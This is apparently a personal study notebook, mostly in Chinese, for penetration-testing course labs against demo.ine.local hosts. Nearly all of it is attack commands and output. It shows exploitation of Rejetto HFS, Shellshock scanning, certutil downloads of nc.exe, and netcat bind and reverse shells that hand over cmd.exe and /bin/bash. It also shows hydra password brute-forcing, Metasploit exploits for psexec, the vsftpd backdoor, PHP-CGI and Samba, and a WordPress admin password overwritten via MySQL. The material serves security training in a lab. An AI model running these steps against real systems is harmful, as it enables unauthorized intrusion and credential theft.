# Vulnerability Scanning
## Banner Grabbing
	識別目標 IP 位址 : 
 		ifconfig (192.168.122.1)
	識別綁定到eth1介面的Kali Linux IP位址，目標IP位址始終是子網路內的下一個IP : 
 		192.168.122.2
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	識別目標系統上執行的服務: 
	自動: 
 		nmap -sV -O 192.168.122.2
		nmap -sV --script=banner 192.8.94.3
	手動 : 
 		nc 192.168.122.2 22
		nc <ip> <port>
## Vulnerability Scanning with Nmap Scripts
	ifconfig (192.195.70.2)
	nmap -sV -O 192.195.70.3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	/gettime.cgi
	 CGI 腳本是在 Web 伺服器上執行的腳本，能夠執行系統級命令並在 Web 伺服器上顯示輸出
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 使用Nmap執行ShellShock漏洞掃描: 
	 nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.195.70.3
	 
		 80/tcp open  http    Apache httpd 2.4.6 ((Unix))
		| http-shellshock: 
		|   VULNERABLE:
		|   HTTP Shellshock vulnerability
		|     State: VULNERABLE (Exploitable)
		|     IDs:  CVE:CVE-2014-6271
		|       This web application might be affected by the vulnerability known
		|       as Shellshock. It seems the server is executing commands injected
		|       via malicious HTTP headers.

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 漏洞掃描腳本: 
	 ls -al /usr/share/nmap/scripts | grep vuln

## Fixing Exploits
	ifconfig (10.10.38.3)
	ping demo.ine.local
	nmap -sV demo.ine.local
		80/tcp    open  http               HttpFileServer httpd 2.3
		3389/tcp  open  ssl/ms-wbt-server?
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit HTTP File Server 2.3
		Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)             | windows/remote/39161.py
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit -m 39161
		Copied to: /root/39161.py
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nano 39161.py
		ip_addr = "10.10.38.3"
		local_port = "1234"
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將 nc.exe 可執行檔複製到桌面: 
		cd Desktop 
		cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 Python 在連接埠 80 上設定 HTTP 伺服器來託管它: 
		python -m SimpleHTTPServer 80
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nc -nvlp 1234
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	python 39161.py demo.ine.local 80
# Shells
## Netcat Fundamentals
	=> Netcat <==> "Swiss Army knife" 
		=> 種允許用戶與網路連接進行互動的多功能工具
		=> 連接埠掃描、傳輸檔案以及設定網路偵聽器或反向 shell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ping demo.ine.local (10.0.24.195)
		nc -help
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 Netcat 連接到開放連接埠: 
		nc 10.0.24.195 80
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	啟用詳細輸出並停用 DNS 解析:
		nc -nv 10.0.24.195 80
		(UNKNOWN) [10.0.24.195] 80 (http) open
		沒有進行DNS解析，因此主機名稱仍未知
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	連接到關閉的連接埠以查看 Netcat 將產生的輸出:
		nc -nv 10.0.24.195 21
		(UNKNOWN) [10.0.24.195] 21 (ftp) : Connection refused

	連線被拒絕。這並不一定意味著連接埠已關閉
	意味著對該連接埠的存取被防火牆阻止或過濾
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	連接 UDP 連接埠: 
		nc -nvu 10.0.24.195 161
		(UNKNOWN) [10.0.24.195] 161 (snmp) open
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將 Netcat 執行檔傳輸到 Windows 系統
		cd /usr/share/windows-binaries
		python -m SimpleHTTPServer 80
		ifconfig (10.10.38.3)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	under target Machine : 
		下載nc.exe可執行檔: 
		cmd : certutil -urlcache -f http://10.10.38.3/nc.exe nc.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	設定 Netcat 監聽器 (kali)
		nc -nvlp 1234
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	連接到執行 Windows 的目標系統的 Netcat 偵聽器
		cmd : nc -nv 10.10.38.3 1234
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 Netcat 傳送訊息(file)
		kali) echo "Hello, this was sent over with Netcat" >> test.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	cmd) nc.exe -nvlp 1234 > test.txt
	kali) nc -nv 10.0.24.195 1234 < test.txt
	cmd) type test.txt
## Bind Shells
	=> 使用 Netcat 設定綁定 shel
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ifconfig (10.10.38.2)
	將 Netcat 執行檔傳輸到 Windows 系統
		cd /usr/share/windows-binaries
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 Python 設定 HTTP 伺服器
		python -m SimpleHTTPServer 80
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	kali to windows : 
		cmd : cd Desktop
		cmd : certutil -urlcache -f http://10.10.38.2/nc.exe nc.exe
		在 Windows 系統上設定 Netcat 偵聽器
		cmd : nc.exe -nvlp 1234 -e cmd.exe
		kali : nc -nv 10.0.18.2 1234
		C:\Users\Administrator\Desktop>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	windows to kali : 
	nc -nvlp 1234 -e /bin/bash
	cmd : nc.exe -nv 10.10.38.2 1234
	ls	
## Reverse Shells
	=> 使用 Netcat 設定反向 shell
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ifconfig (10.10.38.2)
	cd /usr/share/windows-binaries
		python -m SimpleHTTPServer 80
	cmd : cd Desktop
	cmd : certutil -urlcache -f http://10.10.38.2/nc.exe nc.exe
		nc -nvlp 1234
	cmd : nc.exe -nv 10.10.38.2 1234 -e cmd.exe
# Exploitation Frameworks
## The Metasploit Framework (MSF)
	nmap -sS -sV demo.ine.local
	80/tcp    open  http               Apache httpd 2.2.23 ((Win32) PHP/5.2.14)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	分析 Web 應用程式 :
		default password : admin/admin
		管理員面板 : find version 
		ProcessMaker的 Web 應用程式 2.5.0 
	searchsploit ProcessMaker
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q 
		search ProcessMaker
		use exploit/multi/http/processmaker_exec
		set RHOSTS demo.ine.local
		run
# Windows Exploitation
## Port Scanning & Enumeration - Windows
	nmap -sV -sC demo.ine.local
		21/tcp    open  ftp                  Microsoft ftpd
		22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
		80/tcp    open  http                 Microsoft IIS httpd 7.5
		445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
		3306/tcp  open  mysql                MySQL 5.5.20-log
		3389/tcp  open  tcpwrapped
		4848/tcp  open  ssl/http             Oracle Glassfish Application Server   
		7676/tcp  open  java-message-service Java Message Service 301
		8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
		8181/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
		9200/tcp  open  wap-wsp?
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

	nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
		8484/tcp open  http                 Jetty winstone-2.8
		8585/tcp open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 Web Server Enumeration
		=> 80 (Microsoft IIS 7.5 Web 伺服器)
		=> 4848 (GlassFish ) 
		=> 8484(Jenkins 伺服器)
		=> 8585 (WAMP 伺服器) -- WordPress 和 phpMyAdmin
	 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	SMB 枚舉 : 
		鑑於目標系統運行的是 Windows，我們可以在 SMB 連接埠 (445) 上執行枚舉
	nmap -sV -sC -p 445 demo.ine.local
		=> 電腦主機名稱和 NetBIOS 名稱
		=> NetBIOS computer name: VAGRANT-2008R2\x00
		=> OS: Windows Server 2008 R2

	msfconsole -q 
		use /auxiliary/scanner/smb/smb_version
		set RHOSTS demo.ine.local
		run

	[+] 10.0.20.126:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:24m 13s) (guid:{10bbd714-905b-44e8-8eee-c3147ad0c190}) (authentication domain:VAGRANT-2008R2)Windows 2008 R2 Standard SP1 (build:7601) (name:VAGRANT-2008R2)

	[+] 10.0.20.126:445       - 10.0.20.126:445 - Success: '.\administrator:vagrant' Administrator

	[*] Meterpreter session 1 opened (10.10.38.6:4444 -> 10.0.20.126:49550) at 2025-01-16 16:59:30 +0530
## Targeting Microsoft IIS FTP
	=> 識別薄弱配置、測試匿名存取以及進行暴力攻擊以獲得未經授權的存取和操縱 Web 伺服器內容

	nmap -sV -sC demo.ine.local
		21/tcp    open  ftp                  Microsoft ftpd
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp demo.ine.local 21 (anonymous)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://demo.ine.local
		[21][ftp] host: demo.ine.local   login: administrator   password: vagrant
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp demo.ine.local 21 
## Targeting OpenSSh
	nmap -sV -sC -p 22 demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit OpenSSH 7.1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ssh vagrant@demo.ine.local
	ssh Administrator@demo.ine.local
## Targeting SMB
	nmap -sV -sC -p 445 demo.ine.local
		445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
		[445][smb] host: demo.ine.local   login: administrator   password: vagrant

	hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
		[445][smb] host: demo.ine.local   login: vagrant   password: vagrant
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉 Windows 目標上的其他使用者帳戶: 
	enum4linux -u vagrant -p vagrant -U demo.ine.local
	
		user:[Administrator] rid:[0x1f4]
		user:[anakin_skywalker] rid:[0x3f3]
		user:[artoo_detoo] rid:[0x3ef]
		user:[ben_kenobi] rid:[0x3f1]
		user:[boba_fett] rid:[0x3f6]
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 PsExec 進行 SMB 驗證
		cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
		cd Desktop
		chmod +x psexec.py
		python3 psexec.py Administrator@demo.ine.local
		C:\Windows\system32> 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS demo.ine.local
		set SMBUser Administrator
		set SMBPass vagrant
		set payload windows/x64/meterpreter/reverse_tcp
		exploit
## Targeting MySQL Database Server
	=> 獲得對 WordPress 網站的管理控制
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC -p 3306 demo.ine.local
		3306/tcp open  mysql   MySQL 5.5.20-log
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit MySQL 5.5
	msfconsole -q 
		use auxiliary/scanner/mysql/mysql_login
		set RHOSTS demo.ine.local
		set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
		run
	
	[+] 10.0.27.226:3306      - 10.0.27.226:3306 - Success: 'root:'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	mysql -u root -p -h demo.ine.local
		show databases;
		+--------------------+
		| Database           |
		+--------------------+
		| information_schema |
		| cards              |
		| mysql              |
		| performance_schema |
		| test               |
		| wordpress          |
		+--------------------+
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		use wordpress;
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	MySQL [wordpress]> show tables;
		+---------------------------+
		| Tables_in_wordpress       |
		+---------------------------+
		| wp_commentmeta            |
		| wp_comments               |
		| wp_links                  |
		| wp_nf_objectmeta          |
		| wp_nf_objects             |
		| wp_nf_relationships       |
		| wp_ninja_forms_fav_fields |
		| wp_ninja_forms_fields     |
		| wp_options                |
		| wp_postmeta               |
		| wp_posts                  |
		| wp_term_relationships     |
		| wp_term_taxonomy          |
		| wp_termmeta               |
		| wp_terms                  |
		| wp_usermeta               |
		| wp_users                  |
		+---------------------------+
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		select * from wp_users;
		  1 | admin      | $P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0 | admin         | admin@example.com   |          | 2016-09-26 22:28:12 |                     |           0 | admin        |
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

		=> login : http://demo.ine.local:8585/wordpress/wp-admin
# Linux Exploitation
## Port Scanning and Enumeration - Linux
	nmap -sV -p1-10000 10.0.26.53
		512/tcp  open  exec?
		513/tcp  open  login?
		514/tcp  open  tcpwrapped
		1524/tcp open  ingreslock?
	目標系統上有一些開放連接埠沒有服務橫幅
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	非標準連接埠可以使用 Netcat 執行橫幅抓取
	=> maybe discover bind shell
		nc -nv 10.0.26.53 512
		nc -nv 10.0.26.53 1524
		root@d1d6a9361621:/# 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Web 伺服器列舉
		=> http://10.0.26.53
		=> WebDav 目錄
		davtest -url http://10.0.26.53/dav/
		EXEC    php,txt,html     SUCCEED:
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/http/xampp_webdav_upload_php
		set USERNAME ''
		set PASSWORD ''
		set PATH /dav/
		set RHOSTS 10.0.26.53 
	
	[*] Meterpreter session 1 opened (10.10.38.2:4444 -> 10.0.26.53:60634) at 2025-01-16 18:13:05 +0530
## Targeting vsFTPd
	nmap -sV -sC -p 21 demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp demo.ine.local 21 (anonymous)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit vsftpd
		msfconsole
		use exploit/unix/ftp/vsftpd_234_backdoor
		set RHOSTS demo.ine.local
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp demo.ine.local 21
	=> 利用此存取權限上傳反向 shell 負載，以獲得對目標系統的存取權限
## Targeting PHP
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC -p 80 demo.ine.local
		80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	=> phpinfo.php檔案來識別 Web 伺服器上執行的 PHP 版本
	=> demo.ine.local/phpinfo.php
		PHP Version 5.2.4-2ubuntu5.10
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit php cgi
		PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                          | php/remote/18834.rb
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q 
		use exploit/multi/http/php_cgi_arg_injection
		set RHOSTS demo.ine.local
		run
		meterpreter > 
## Targeting SAMBA
	=> Samba 是一個開源軟體套件，可為 SMB/CIFS 用戶端提供無縫文件和列印服務
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -p 445 demo.ine.local	
		445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap 掃描不會顯示目標上運行的 Samba 的確切版本，因此，我們需要使用 Metasploit 模組來識別此資訊	
	msfconsole -q
		use auxiliary/scanner/smb/smb_version
		set RHOSTS demo.ine.local
		run
	
	[*] 10.0.27.139:445       -   Host could not be identified: Unix (Samba 3.0.20-Debian)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit samba 3.0.20
		Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit | unix/remote/16320.rb
	
	search samba Command Execution 
		use exploit/multi/samba/usermap_script
		set RHOSTS demo.ine.local
		exploit
	
	[*] Command shell session 1 opened (10.10.38.2:4444 -> 10.0.27.139:42372) 

	
